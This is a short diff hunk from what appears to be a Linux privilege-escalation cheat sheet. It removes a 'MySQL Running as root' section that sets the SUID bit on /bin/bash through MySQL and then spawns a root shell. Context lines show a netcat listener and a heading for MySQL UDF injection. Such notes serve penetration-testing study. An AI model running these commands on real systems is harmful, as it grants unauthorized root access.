@@ -908,21 +908,6 @@ nc -lvnp 9999
 id && whoami
 ```
 
-# MySQL Running as root
-
-Example 1
-```
-ps aux | grep root
-
-mysql -u root -p
-
-\! chmod +s /bin/bash
-exit
-ls -la /bin/bash                          // Verify that the SUID bit is set
-/bin/bash -p 
-id && whoami
-```
-
 # MySQL UDF (User-Defined Functions) Code (UDF) Injection
 
 Example 1
